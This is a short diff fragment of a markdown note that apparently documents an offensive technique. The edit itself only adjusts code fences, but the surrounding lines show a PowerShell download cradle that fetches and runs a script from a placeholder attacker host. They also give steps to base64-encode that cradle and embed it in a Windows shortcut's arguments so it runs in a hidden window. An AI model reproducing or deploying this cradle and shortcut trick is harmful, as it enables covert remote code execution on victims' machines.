@@ -27,7 +27,8 @@ cradle content:- IEX(New-Object Net.WebClient).downloadString("http://attacker_i
 
 #Make a encoded raw code and paste with below command.
 cat cradle | iconv -t utf-16le | base64 -w0; echo
-
+```
+```language
 $Shortcut.Arguments = "-Nop -sta -noni -w hidden -encodedCommand <encoded_code_here>"
 ```
 ```language
